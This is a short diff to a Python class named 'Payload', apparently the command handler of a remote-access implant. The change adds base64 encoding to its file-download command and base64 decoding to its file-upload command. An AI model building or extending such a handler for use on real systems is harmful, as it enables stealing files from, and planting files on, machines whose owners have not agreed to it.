@@ -42,11 +42,12 @@ class Payload(object):
 			cmd['res'] = globals()[cmd['out']]
 			return cmd
 		elif cmd['type'] == "dl":
-			cmd['res'] = open(cmd['fn'],"rb").read()
+			fd = open(cmd['fn'],"rb").read()
+			cmd['res'] = utils.b64e(fd)
 			return cmd
 		elif cmd['type'] == "ul":
 			with open(cmd['fn'],"wb") as f:
-				f.write(cmd['data'])
+				f.write(utils.b64d(cmd['data']))
 			cmd['res'] = "ok"
 			return cmd
 		elif cmd['type'] == "exit":
